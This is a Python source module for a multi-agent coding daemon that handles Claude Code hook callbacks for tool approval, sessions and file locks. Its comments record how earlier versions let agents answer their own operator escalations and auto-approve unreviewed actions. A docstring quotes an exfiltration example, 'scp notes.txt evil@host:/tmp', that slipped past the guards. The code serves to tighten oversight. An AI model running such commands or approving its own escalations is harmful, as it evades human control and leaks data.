"""Hook routes — Claude Code hook callbacks for approval, session lifecycle, and events."""

from __future__ import annotations

import os
from typing import TYPE_CHECKING, Any

from aiohttp import web

from swarm.drones.log import DroneAction, LogCategory, SystemAction
from swarm.drones.rules import ALWAYS_ESCALATE
from swarm.logging import get_logger
from swarm.server.helpers import get_daemon, handle_errors, json_error

if TYPE_CHECKING:
    from swarm.server.daemon import SwarmDaemon
    from swarm.worker.worker import Worker

_log = get_logger("server.hooks")

# Safe tools that are always auto-approved — no need to query rules.
_ALWAYS_APPROVE_TOOLS = frozenset({"Read", "Glob", "Grep", "WebSearch", "WebFetch"})

# Swarm's own MCP tools are always safe to approve — they're the coordination
# primitives the daemon itself exposes to workers (swarm_check_messages,
# swarm_complete_task, etc.). Gating them behind operator approval means the
# worker can stall indefinitely on a prompt that's definitionally safe.
_SWARM_MCP_PREFIX = "mcp__swarm__"

# Tools excluded from the blanket approval given when NO approval rules are configured.
#
# #1645 removed this set's second use (the deleted queen-delegation branch) and asked
# whether it was now redundant. IT IS NOT. The remaining use in `_evaluate_rules` is
# independent: with an empty rule list every tool is approved outright, and dropping this
# set would hand Bash a blanket approval on an unconfigured install — a worse failure than
# the one #1645 fixed. It is kept as a live guard, not as documentation of intent.
_ALWAYS_ESCALATE_TOOLS = frozenset({"Bash"})

# TOOLS THAT EXIST TO REACH A HUMAN, AND SO CAN NEVER BE AUTO-APPROVED.
#
# Distinct from _ALWAYS_ESCALATE_TOOLS on purpose. That set only guards the
# no-rules-configured branch; a matching rule still approves, and Bash DEPENDS on that
# (drones approve safe Bash by rule constantly). This set is checked BEFORE rules run,
# so no rule and no empty config can answer for the operator. (Queen delegation was the
# third way in and no longer exists — #1645 deleted it.)
#
# WHY THIS EXISTS (task #1443). AskUserQuestion was approvable like any other tool. The
# drone's approval response for Claude is "\r" — a bare Enter — and Enter on an option
# picker selects the HIGHLIGHTED option. So the escalation returned a verbatim option
# label the operator never chose, identically every time it was re-asked, while a real
# human answer to another question in the same set passed through. 400 occurrences since
# 2026-07-13; it went unnoticed because the highlighted option is often plausible.
#
# Fabricated answers drove real production actions: a live fulfilment order, six deploys,
# a D365 write instruction, and a programme-level ruling. An escalation path that answers
# itself makes every "ask the operator" guard rail decorative.
#
# THE RULE: if a tool's purpose is to obtain a human decision, no automation may supply
# that decision. Adding to this set should be argued, not assumed — but the bar for
# membership is exactly that question.
# ExitPlanMode added 2026-08-11 at the operator's direction, on the same reasoning:
# its entire purpose is to obtain a human decision — approval of a plan before work
# starts. Auto-approving it means an agent writes a plan and then approves its own plan,
# which is the same defect as answering your own escalation and is arguably worse,
# because everything downstream inherits the unreviewed plan.
_NEVER_AUTO_APPROVE = frozenset({"AskUserQuestion", "ExitPlanMode"})


def register(app: web.Application) -> None:
    app.router.add_post("/api/hooks/approval", handle_approval)
    app.router.add_post("/api/hooks/session-end", handle_session_end)
    app.router.add_post("/api/hooks/session-start", handle_session_start)
    app.router.add_post("/api/hooks/event", handle_event)


@handle_errors
async def handle_approval(request: web.Request) -> web.Response:
    """PreToolUse hook endpoint — evaluate tool use against drone approval rules.

    Receives Claude Code's PreToolUse hook input:
    ``{"tool_name": "Bash", "tool_input": {...}, "session_id": "...", ...}``

    Returns ``{"decision": "approve"|"block"|"passthrough", "reason": "..."}``
    """
    d = get_daemon(request)

    try:
        body: dict[str, Any] = await request.json()
    except Exception:
        return json_error("invalid JSON body", status=400)

    tool_name = body.get("tool_name", "")
    tool_input = body.get("tool_input", {})

    if not tool_name:
        return json_error("missing tool_name", status=400)

    # Track tool activity on the worker (Phase 2: agent progress)
    worker = _identify_worker(d, body)
    if worker is not None:
        _record_tool_activity(worker, tool_name, tool_input)

    # File conflict prevention: block Edit/Write if another worker holds the lock
    conflict = _check_file_lock(d, worker, tool_name, tool_input)
    if conflict is not None:
        return conflict

    # Fast path: always-approve safe read-only tools
    if tool_name in _ALWAYS_APPROVE_TOOLS:
        return web.json_response({"decision": "approve", "reason": "safe read-only tool"})

    # Fast path: Swarm's own MCP tools never require operator approval.
    if tool_name.startswith(_SWARM_MCP_PREFIX):
        _log_hook_decision(d, tool_name, "approve", "swarm MCP tool")
        return web.json_response({"decision": "approve", "reason": "swarm MCP tool"})

    # Build a text representation of the tool call for rules matching.
    # This mirrors what the drone sees in terminal output.
    tool_text = _build_tool_text(tool_name, tool_input)

    # Safety net: escalate destructive patterns to operator (never auto-approve)
    if ALWAYS_ESCALATE.search(tool_text):
        _log_hook_decision(d, tool_name, "escalate", "destructive pattern detected")
        return web.json_response({"decision": "passthrough"})

    return _evaluate_rules(d, body, tool_name, tool_text)


@handle_errors
async def handle_session_end(request: web.Request) -> web.Response:
    """SessionEnd hook endpoint — notify daemon that a Claude session ended.

    This enables immediate STUNG detection without relying on /proc polling.
    """
    d = get_daemon(request)

    try:
        body: dict[str, Any] = await request.json()
    except Exception:
        return json_error("invalid JSON body", status=400)

    session_id = body.get("session_id", "")
    _log.info("session ended: %s", session_id or "(unknown)")

    # Find which worker this session belongs to and mark it
    worker = _identify_worker(d, body)
    if worker:
        _log.info("session end for worker %s — signaling STUNG", worker.name)
        # Emit event so pilot picks up the session end immediately
        d.broadcast_ws(
            {
                "type": "hook_session_end",
                "worker": worker.name,
                "session_id": session_id,
            }
        )
    else:
        _log.debug("session end from unknown worker (session_id=%s)", session_id)

    return web.json_response({"status": "ok"})


# Maximum number of unread messages to inline into the SessionStart bootstrap.
# If a worker has more, the rest are summarized as a count + pointer to MCP.
_BOOTSTRAP_MSG_LIMIT = 5

# Truncation limits for the bootstrap markdown so context stays bounded.
_BOOTSTRAP_DESC_CHARS = 500
_BOOTSTRAP_MSG_CHARS = 280

# Discoverability nudge — appended to every bootstrap so workers know the
# Swarm-specific slash commands exist.  See src/swarm/hooks/commands/.
_SLASH_COMMANDS_NUDGE = (
    "**Swarm slash commands available:** "
    "`/swarm-status` `/swarm-handoff` `/swarm-finding` "
    "`/swarm-warning` `/swarm-blocker` `/swarm-progress` "
    "— type `/help` for the full list."
)


def _empty_bootstrap_response() -> web.Response:
    """SessionStart no-op response — Claude Code injects nothing."""
    return web.json_response(
        {
            "hookSpecificOutput": {
                "hookEventName": "SessionStart",
                "additionalContext": "",
            }
        }
    )


@handle_errors
async def handle_session_start(request: web.Request) -> web.Response:
    """SessionStart hook endpoint — inject per-worker bootstrap into Claude's context.

    Receives Claude Code's SessionStart hook input::

        {"session_id": "...", "cwd": "...", "hook_event_name": "SessionStart",
         "source": "startup"|"resume"|"clear"|"compact", ...}

    Returns ``hookSpecificOutput.additionalContext`` containing the worker's
    assigned task and unread inter-worker messages, so the worker doesn't
    have to remember to call ``swarm_check_messages`` / ``swarm_task_status``
    before starting work.

    Behavior:
      * ``source == "resume"`` → no injection (transcript already has it).
      * Unknown worker → no injection.
      * Daemon errors → fail open (empty additionalContext, status 200).
      * Messages stay unread; the worker still has to ack via MCP.
    """
    d = get_daemon(request)

    try:
        body: dict[str, Any] = await request.json()
    except Exception:
        return _empty_bootstrap_response()

    source = body.get("source", "startup")
    # Skip on resume — the transcript already contains the original bootstrap
    if source == "resume":
        return _empty_bootstrap_response()

    worker = _identify_worker(d, body)
    if worker is None:
        _log.debug("session start from unknown worker (source=%s)", source)
        return _empty_bootstrap_response()

    additional_context = _build_bootstrap_context(d, worker)
    if not additional_context:
        return _empty_bootstrap_response()

    _log_session_bootstrap(d, worker.name, source, additional_context)

    return web.json_response(
        {
            "hookSpecificOutput": {
                "hookEventName": "SessionStart",
                "additionalContext": additional_context,
            }
        }
    )


@handle_errors
async def handle_event(request: web.Request) -> web.Response:
    """Generic hook event endpoint — forward Claude Code lifecycle events.

    Handles SubagentStart, SubagentStop, PreCompact, PostCompact, TeammateIdle.
    """
    d = get_daemon(request)

    try:
        body: dict[str, Any] = await request.json()
    except Exception:
        return json_error("invalid JSON body", status=400)

    # Claude Code sends "hook_event_name"; keep "hook_event" as a fallback
    # for manual test payloads and forward-compat.
    hook_event = body.get("hook_event_name") or body.get("hook_event", "unknown")
    worker = _identify_worker(d, body)
    worker_name = worker.name if worker else "unknown"

    _log.debug("hook event %s from worker %s", hook_event, worker_name)

    # Track compaction state on workers (+ capture before/after token delta
    # so we can measure compaction effectiveness over time).
    if worker and hook_event in ("PreCompact", "preCompact"):
        worker.compacting = True
        worker._compact_tokens_before = worker.usage.last_turn_input_tokens
    elif worker and hook_event in ("PostCompact", "postCompact"):
        worker.compacting = False
        worker._context_warned = False  # reset warning after successful compact
        _log_compact_event(d, worker, body)

    # Broadcast to dashboard subscribers
    d.broadcast_ws(
        {
            "type": "hook_event",
            "hook_event": hook_event,
            "worker": worker_name,
            "data": body,
        }
    )

    return web.json_response({"status": "ok"})


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _log_compact_event(d: SwarmDaemon, worker: Worker, body: dict[str, Any]) -> None:
    """Record a compact event to the buzz log with before/after token counts.

    PreCompact stashed ``worker._compact_tokens_before`` on the worker.
    At PostCompact we read the current turn tokens and record the delta
    so the operator can measure how effective compaction is over time.
    Trigger ('auto' vs 'manual') is inferred from the hook payload when
    Claude Code supplies it; otherwise defaults to 'manual'.
    """
    before = worker._compact_tokens_before
    after = worker.usage.last_turn_input_tokens
    trigger = str(body.get("trigger") or body.get("compact_trigger") or "manual")
    ratio: float | None = None
    if before > 0 and after >= 0:
        ratio = round(after / before, 3) if before else None
    metadata: dict[str, object] = {
        "tokens_before": before,
        "tokens_after": after,
        "trigger": trigger,
    }
    if ratio is not None:
        metadata["ratio"] = ratio
    detail_parts = [f"{before}→{after} tokens"]
    if ratio is not None:
        detail_parts.append(f"ratio={ratio}")
    detail_parts.append(f"trigger={trigger}")
    d.drone_log.add(
        SystemAction.COMPACT,
        worker.name,
        " ".join(detail_parts),
        category=LogCategory.COMPACT,
        metadata=metadata,
    )
    worker._compact_tokens_before = 0


def _evaluate_rules(
    d: SwarmDaemon, body: dict[str, Any], tool_name: str, tool_text: str
) -> web.Response:
    """Evaluate tool use against drone approval rules and return a JSON response."""
    from swarm.drones.rules import dry_run_rules

    pilot = d.pilot
    if pilot is None or not pilot.enabled:
        return web.json_response({"decision": "passthrough", "reason": "drones disabled"})

    drone_config = d.config.drones
    worker = _identify_worker(d, body)
    worker_name = worker.name if worker else "unknown"

    # BEFORE any rule evaluation — see _NEVER_AUTO_APPROVE. Checked here rather than in
    # the branches below because there are three separate ways to reach "approve" (rule
    # match, queen delegation, and no-rules-configured) and a guard placed in one of them
    # leaves the other two open. That is precisely how this defect survived: the
    # no-rules branch already consulted _ALWAYS_ESCALATE_TOOLS while the rule-matched
    # branch did not.
    if tool_name in _NEVER_AUTO_APPROVE:
        _log_hook_decision(d, tool_name, "passthrough", "never auto-approved", worker_name)
        return web.json_response(
            {
                "decision": "passthrough",
                "reason": (f"{tool_name} asks a human for a decision — drones never answer it"),
            }
        )

    # Collect per-worker + global rules
    worker_rules: list[Any] = []
    if worker and pilot._worker_configs:
        wc = pilot._worker_configs.get(worker.name)
        if wc is not None and wc.approval_rules:
            worker_rules = list(wc.approval_rules)
    all_rules = worker_rules + list(drone_config.approval_rules)

    if not all_rules and tool_name not in _ALWAYS_ESCALATE_TOOLS:
        _log_hook_decision(d, tool_name, "approve", "no rules configured", worker_name)
        return web.json_response({"decision": "approve", "reason": "no approval rules configured"})

    results = dry_run_rules(
        tool_text, all_rules, allowed_read_paths=drone_config.allowed_read_paths
    )
    if not results:
        return web.json_response({"decision": "passthrough", "reason": "no matching rule"})

    result = results[0]
    if result.decision == "approve":
        _log_hook_decision(d, tool_name, "approve", f"rule matched: {result.source}", worker_name)
        return web.json_response(
            {
                "decision": "approve",
                "reason": f"Approved by drone rule ({result.source})",
            }
        )

    # #1647: THE THREE EFFECT-BASED GUARDS DENY RATHER THAN ABSTAIN. Operator decision
    # 2026-08-15, on this measurement: 18 of 18 workers in the live roster were in auto
    # mode, where `passthrough` hands the call to a classifier that does not implement
    # worktree boundaries, credential paths or outbound-data rules. A control that only
    # withholds an auto-approval is not a control on that fleet — two probe commands this
    # path correctly refused both executed, with no picker shown.
    #
    # SCOPED TO `unsafe_command` DELIBERATELY. These three (#1589/#1590) carry the evidence
    # that justifies a hard deny: 5 of 7 hostile commands auto-approved before they existed.
    # `default_escalate` and rule-driven escalations keep passing through, so the operator
    # can still say yes to ordinary work via a picker in default mode.
    #
    # Mode is NOT consulted here on purpose: it is display-derived and was measured going
    # stale inside 90 seconds, and a security decision must not depend on an observation
    # that transient.
    # `unsafe_effect`, NOT `unsafe_command` — see dry_run_rules. The latter also covers
    # compound-segment and command-substitution refusals, which the ruling did not cover
    # and which must keep abstaining. Blocking on the coarse source denied `cd /repo &&
    # pytest` fleet-wide within a minute of the daemon restart.
    if result.source == "unsafe_effect":
        _log_hook_decision(d, tool_name, "block", f"denied: {result.rule_pattern}", worker_name)
        return web.json_response(
            {
                "decision": "block",
                "reason": (
                    f"Denied by drone safety guard: {result.rule_pattern}. This is refused "
                    f"outright rather than escalated, because on an auto-mode worker an "
                    f"escalation reaches a classifier that does not implement this rule "
                    f"(#1647). If the command is legitimate, narrow it — write inside the "
                    f"worktree, or use the session scratchpad, which is exempt."
                ),
            }
        )

    # "escalate" → pass through so Claude Code's own permission gate decides.
    #
    # WHAT PASSTHROUGH DOES AND DOES NOT GUARANTEE (#1647). It is an ABSTENTION, not an
    # approval and not a denial: the hook exits 0 with no stdout and Claude Code decides.
    # In DEFAULT mode that renders a permission picker — a real gate. In AUTO mode the
    # classifier decides, and the swarm's rules have no say. Do not read the branch below
    # as gating anything on its own; whether it gates depends on the worker's permission
    # mode, which is surfaced as `permission_mode` on the worker (last OBSERVED value).
    #
    # #1645, OPERATOR RULING 2026-08-15. This used to consult `_queen_can_approve` and
    # return APPROVE for every tool except Bash — but that helper only checked that a
    # Queen object existed and was enabled. She was never sent the call, nothing was
    # queued for her, and "Approved under queen oversight" meant nothing more than
    # "a Queen is configured", which is always. A rule that said escalate resolved to
    # allow with nobody in the loop, including on the `default_escalate` branch — the
    # fail-safe, inverted. Measured at 519 such approvals in 24h, led by Edit and Write.
    #
    # The ruling was to delete it rather than invent a consultation mechanism, because
    # the correct behaviour was already in the tree: Bash was the one tool excluded from
    # the branch, it has always taken this path, and nothing was ever stuck on it.
    _log_hook_decision(d, tool_name, "passthrough", f"escalated: {result.source}", worker_name)
    return web.json_response(
        {
            "decision": "passthrough",
            "reason": f"Requires operator approval ({result.source})",
        }
    )


_MAX_RECENT_TOOLS = 5


def _check_file_lock(
    d: SwarmDaemon, worker: Worker | None, tool_name: str, tool_input: dict[str, Any]
) -> web.Response | None:
    """Warn or block Edit/Write when ANOTHER worker holds the file lock.

    THIS PATH HARD-BLOCKED REGARDLESS OF ``coordination.file_ownership``. The
    operator's config reads ``"warning"`` — advisory — and the workers' briefs
    said so, correctly. This function never consulted the setting, so a mode
    nobody selected was enforced fleet-wide and read as a broken tool rather
    than a policy. Honouring the mode is both the fix and the off switch.

    Note there are TWO file-coordination systems and they are not the same one:
    ``d.file_ownership`` (FileOwnershipMap, derived from git conflicts, already
    mode-aware, served by ``/api/coordination/ownership``) and ``d.file_locks``
    (this dict, written by ``swarm_claim_file`` and by this hook). Only the
    first honoured the mode. They still share the operator's single setting,
    which is the point — one control, not two.

    FAILS OPEN ON UNKNOWN IDENTITY. ``_identify_worker`` is a CWD heuristic and
    returns None whenever it cannot match a worker path. The old code turned
    that None into the literal name ``"unknown"``, which then compared unequal
    to every real owner — so an unidentified worker was blocked from every
    claimed file, and the refusal named the legitimate holder. That is the
    reported symptom: the claim holder appearing to be refused its own file.
    It also wrote ``"unknown"`` into the lock table on the way past, taking
    ownership away from whoever actually held it. A guard that cannot tell who
    is asking must not be the thing that says no.
    """
    if tool_name not in ("Edit", "Write"):
        return None
    file_path = tool_input.get("file_path", "")
    if not file_path:
        return None
    # Unknown identity: allow, and do not record a lock under a name that is not
    # a worker. Both halves matter — the second is how "unknown" dispossessed a
    # real claim holder and made claiming actively harmful.
    if worker is None:
        return None

    import os
    import time

    from swarm.coordination.ownership import OwnershipMode

    mode = getattr(getattr(d, "file_ownership", None), "mode", OwnershipMode.WARNING)
    if mode == OwnershipMode.OFF:
        return None

    resolved = os.path.realpath(file_path)
    lock = d.file_locks.get(resolved)
    worker_name = worker.name
    now = time.time()
    if lock:
        lock_owner, lock_time = lock
        if lock_owner != worker_name and (now - lock_time) < d._file_lock_ttl:
            # WARNING, not INFO: the daemon runs at log_level=WARNING, so the
            # previous _log.info left no record at any destination — a denial
            # nobody outside the blocked worker could diagnose. _log_hook_decision
            # additionally puts it in the drone log, which is where every other
            # decision on this route already goes; this was the one that skipped it.
            _log.warning(
                "file conflict: %s locked by %s, requested by %s (mode=%s)",
                resolved,
                lock_owner,
                worker_name,
                mode.value,
            )
            verdict = "block" if mode == OwnershipMode.HARD_BLOCK else "passthrough"
            _log_hook_decision(d, tool_name, verdict, f"file locked by {lock_owner}", worker_name)
            if mode == OwnershipMode.HARD_BLOCK:
                return web.json_response(
                    {
                        "decision": "block",
                        "reason": (
                            f"File locked by worker {lock_owner} (you are {worker_name}). "
                            f"Coordinate with them, or set coordination.file_ownership "
                            f"to 'warning' to make claims advisory."
                        ),
                    }
                )
            # Advisory mode: the conflict is now on the record, but the write
            # proceeds and the lock is NOT stolen from its holder.
            return None
    # Acquire/refresh lock
    d.file_locks[resolved] = (worker_name, now)
    return None


def _record_tool_activity(worker: Worker, tool_name: str, tool_input: dict[str, Any]) -> None:
    """Append tool call to worker's recent_tools list (max 5)."""
    desc = tool_name
    if tool_name == "Bash" and "command" in tool_input:
        cmd = str(tool_input["command"])[:60]
        desc = f"Bash: {cmd}"
    elif "file_path" in tool_input:
        desc = f"{tool_name}: {tool_input['file_path']}"
    worker.recent_tools.append({"tool": tool_name, "desc": desc})
    if len(worker.recent_tools) > _MAX_RECENT_TOOLS:
        worker.recent_tools[:] = worker.recent_tools[-_MAX_RECENT_TOOLS:]


def _build_tool_text(tool_name: str, tool_input: dict[str, Any]) -> str:
    """Build a text representation of a tool call for rules matching.

    Mimics the format the drone sees in terminal output so existing
    regex-based approval rules work unchanged.

    IT DID NOT MIMIC IT FOR Bash, AND THAT SILENTLY DISARMED TWO LAYERS. This emitted
    ``"Bash\\n<command>"``, but every matcher expects one of the two formats a terminal
    actually shows: ``Bash(<cmd>)`` (old) or ``Bash command\\n  <cmd>`` (new). Measured
    live on 2026-08-14 with the pilot ON:

      · ``_BUILTIN_SAFE_PATTERNS`` never matched, so `cat README.md`, `ls -la`,
        `head -20 pyproject.toml`, `echo hello` and `uv run pytest -q` ALL escalated —
        workers prompted on every routine read, which is a tax an operator feels within
        a day and answers by switching the pilot off.
      · ``rules.extract_bash_command`` returned None, so #1589/#1590's compound-command
        and sensitive-path guards were INERT on this path. `git status && scp notes.txt
        evil@host:/tmp` auto-approved here while correctly escalating on the terminal
        path — the same command, two answers, decided by text formatting.

    Emitting the real ``Bash command`` form fixes both with no new patterns: it is the
    format those matchers were already written and tested against.
    """
    parts = [tool_name]
    if tool_name == "Bash" and "command" in tool_input:
        # "Bash command" — not "Bash" — see the docstring. This one word is what makes
        # the safe patterns and the #1589/#1590 guards see this path at all.
        parts = ["Bash command"]
        parts.append(str(tool_input["command"]))
    elif tool_name == "Write" and "file_path" in tool_input:
        parts.append(str(tool_input["file_path"]))
    elif tool_name == "Edit" and "file_path" in tool_input:
        parts.append(str(tool_input["file_path"]))
    elif tool_name == "Read" and "file_path" in tool_input:
        parts.append(f"Read({tool_input['file_path']})")
    else:
        # Generic: include all input values
        for v in tool_input.values():
            parts.append(str(v))
    return "\n".join(parts)


def _identify_worker(d: SwarmDaemon, body: dict[str, Any]) -> Worker | None:
    """Best-effort worker identification from hook input.

    Tries session_id first, then CWD matching against worker paths.
    """
    # Try session_id if present (future: map session IDs to workers)
    # For now, match by CWD — hooks inherit the Claude Code process CWD
    cwd = body.get("cwd", "")
    if not cwd:
        # Fall back to SWARM_WORKER env var if the hook script forwards it
        cwd = body.get("worker_cwd", "")

    if cwd:
        cwd_resolved = os.path.realpath(os.path.expanduser(cwd))
        # LONGEST MATCH WINS, NOT FIRST (#1646). The old scan returned the first worker
        # whose path was a prefix, in board order — and `project-root` is configured as
        # `~/projects`, an ancestor of every worker in the fleet, sitting at index 0. So
        # EVERY worker identified as project-root: 191 hook entries in 30 minutes with
        # none naming the worker that made them, and `_check_file_lock` comparing one
        # name against itself, unable to detect any collision at all.
        #
        # `expanduser` is not incidental. Eight workers are configured with `~/...`
        # paths, and `realpath("~/projects/x")` does not expand `~` — they could never
        # have matched even once the ordering was fixed, so a longest-match fix alone
        # would have looked complete while a third of the fleet still misidentified.
        best: Worker | None = None
        best_len = -1
        for w in d.workers:
            if not (hasattr(w, "path") and w.path):
                continue
            worker_path = os.path.realpath(os.path.expanduser(str(w.path)))
            if cwd_resolved == worker_path or cwd_resolved.startswith(worker_path + "/"):
                if len(worker_path) > best_len:
                    best, best_len = w, len(worker_path)
        if best is not None:
            return best

    # Fallback: if only one worker exists, it's probably that one
    if len(d.workers) == 1:
        return d.workers[0]

    return None


def _log_hook_decision(
    d: SwarmDaemon,
    tool_name: str,
    decision: str,
    reason: str,
    worker_name: str = "unknown",
) -> None:
    """Log a hook-based approval decision to the drone log."""
    if d.drone_log is not None:
        d.drone_log.add(
            DroneAction.CONTINUED if decision == "approve" else SystemAction.QUEEN_BLOCKED,
            worker_name,
            f"hook:{tool_name} → {decision} ({reason})",
            metadata={"source": "hook", "tool_name": tool_name},
            category=LogCategory.DRONE,
        )


def _bootstrap_task_block(d: SwarmDaemon, worker_name: str) -> str:
    """Render the active-task section of the bootstrap, or '' if none."""
    task_board = getattr(d, "task_board", None)
    if task_board is None:
        return ""
    try:
        assigned_or_active_tasks = task_board.assigned_or_active_tasks_for_worker(worker_name)
    except Exception:
        _log.warning("failed to fetch active tasks for %s", worker_name, exc_info=True)
        return ""
    if not assigned_or_active_tasks:
        return ""

    # Workers are typically assigned a single task at a time; show the first.
    task = assigned_or_active_tasks[0]
    description = (task.description or "").strip()
    if len(description) > _BOOTSTRAP_DESC_CHARS:
        description = description[:_BOOTSTRAP_DESC_CHARS].rstrip() + "…"
    lines = [
        f"**Your assigned task:** {task.title}",
        f"**Status:** {task.status.value}",
    ]
    if description:
        lines.append(f"**Description:** {description}")
    return "\n".join(lines)


def _bootstrap_messages_block(d: SwarmDaemon, worker_name: str) -> str:
    """Render the unread-messages section of the bootstrap, or '' if none."""
    message_store = getattr(d, "message_store", None)
    if message_store is None:
        return ""
    try:
        unread = message_store.get_unread(worker_name, limit=20)
    except Exception:
        _log.warning("failed to fetch unread messages for %s", worker_name, exc_info=True)
        return ""
    if not unread:
        return ""

    shown = unread[:_BOOTSTRAP_MSG_LIMIT]
    overflow = len(unread) - len(shown)
    lines = [f"**Unread messages ({len(unread)}):**"]
    for msg in shown:
        content = (msg.content or "").strip().replace("\n", " ")
        if len(content) > _BOOTSTRAP_MSG_CHARS:
            content = content[:_BOOTSTRAP_MSG_CHARS].rstrip() + "…"
        lines.append(f"- From `{msg.sender}` ({msg.msg_type}): {content}")
    if overflow > 0:
        lines.append(f"- *…and {overflow} more — call `swarm_check_messages` for the full list*")
    return "\n".join(lines)


def _build_bootstrap_context(d: SwarmDaemon, worker: Worker) -> str:
    """Assemble the SessionStart bootstrap markdown for a worker.

    Returns an empty string if there's nothing to inject.
    """
    parts = [
        block
        for block in (
            _bootstrap_task_block(d, worker.name),
            _bootstrap_messages_block(d, worker.name),
        )
        if block
    ]
    if not parts:
        return ""

    # Append the slash-commands nudge so workers discover /swarm-* in /help.
    # Only emitted when there's already bootstrap content; fresh empty workers
    # discover via /help directly.
    parts.append(_SLASH_COMMANDS_NUDGE)

    header = "## Swarm Bootstrap"
    footer = (
        "_This bootstrap was injected by the Swarm SessionStart hook. "
        "Messages remain unread until you call `swarm_check_messages`._"
    )
    return "\n\n".join([header, *parts, footer])


def _log_session_bootstrap(
    d: SwarmDaemon, worker_name: str, source: str, additional_context: str
) -> None:
    """Record the bootstrap event in the drone/buzz log for visibility."""
    if d.drone_log is None:
        return
    try:
        d.drone_log.add(
            SystemAction.SESSION_BOOTSTRAP,
            worker_name,
            f"session_start({source}): injected {len(additional_context)} chars",
            metadata={"source": source, "context_chars": len(additional_context)},
            category=LogCategory.SYSTEM,
        )
    except Exception:
        _log.warning("failed to log session bootstrap for %s", worker_name, exc_info=True)
